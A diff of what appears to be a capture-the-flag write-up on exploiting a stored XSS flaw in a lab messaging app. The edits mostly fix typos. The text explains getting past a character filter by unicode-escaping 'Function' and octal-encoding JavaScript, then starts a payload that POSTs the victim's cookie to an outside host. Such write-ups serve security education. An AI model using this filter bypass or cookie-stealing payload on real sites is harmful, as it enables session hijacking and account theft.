@@ -37,18 +37,18 @@ Let's try it out with a simple string as the payload. The inputed message will b
 
 ![test exploit 1 response](robberts_secure_messaging_service/test_exploit1_response.png)
 
-We now know that we can craft a message which will make a readers browser execute arbritrary JS code. However, we still have two problems. The first problem being that we cannot put normal JS code as the payload, since most letters will be modified, chaning it to invalid JS code. The other problem is that we still need to identify a way we can use the stored XSS vulnerability.
+We now know that we can craft a message which will make a readers browser execute arbritrary JS code. However, we still have two problems. The first problem being that we cannot put normal JS code as the payload, since most letters will be modified, changing it to invalid JS code. The other problem is that we still need to identify a way we can use the stored XSS vulnerability.
 
 
-When XSS vulnerability are identified, the first thing I check is if the cookies used by the website can be accessed by JS code. 
+When XSS vulnerability are identified, the first thing I check is whether cookies used by the website can be accessed by JS code. 
 ![website cookie](robberts_secure_messaging_service/cookie.png)
-We see that the `HttpOnly` attribute is set to False. This allows client-side code, such as JS, to access the cookie. Therefore, the goal of our payload will be to read and transfer the cookie of the Robbert.
+We see that the `HttpOnly` attribute is set to False. This allows client-side code, such as JS, to access the cookie. Therefore, the goal of our payload will be to read and transfer the cookie of Robbert.
 
 We now need to solve the other problem, finding a way to send a payload which is not modified by the application. To do this, we need to in some way not use most letters. After doing some research, i found that JS code can be executed using [unicode escape sequences](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Character_escape). The problem with using unicode escape sequences is that it may still contain some characters which are modified by the web app, since it uses hexadecimal. To limit the usage of unicode, we will choese a function which can execute JS by passing it a string containing JS code. The reason for this is that strings can be encoded using octal encoding, which will only contain the character `\` and numbers.
 
 The JS function I chose is named `Function()`. This function will take a string as input and will execute it once it is called. The reason for choosing this function is that when encoding it into unicode, we get:
-`\u0046\u0075\u006E\u0063\u0074\u0069\u006F\u006E`
-This unicode string mostly only contains characters which are not changed by the web app. The only problem is the `\u006F` which conatins the letter F. However, the unicode `\u006F` represents the letter `o`, which is unmodified by the web app. This allows us to change the unicode `\u006F` with `o`, giving us the string:
+`\u0046\u0075\u006E\u0063\u0074\u0069\u006F\u006E`.
+This unicode string mostly satisfies the allowed charset which is not changed by the web app. The only problem is the `\u006F` which conatins the letter F. However, the unicode `\u006F` represents the letter `o`, which is unmodified by the web app. This allows us to change the unicode `\u006F` with `o`, giving us the string:
 `\u0046\u0075\u006E\u0063\u0074\u0069o\u006E`.
 
 We can now add this to our message:
@@ -57,7 +57,7 @@ We can now add this to our message:
 
 This message will allows us to execute any JS code in a readers browser by putting octal encoded JS code in the `PAYLOAD` field.
 
-The payload I used will post a message of the readers cookie to my user message board. 
+The payload I used will post a message of the readers (Robberts) cookie to my user message board. 
 ```
 var xhr = new XMLHttpRequest();
 xhr.open('POST', 'https://rorovovarorsospoprorakokeror.appsec.nu/messageboard.php', true);
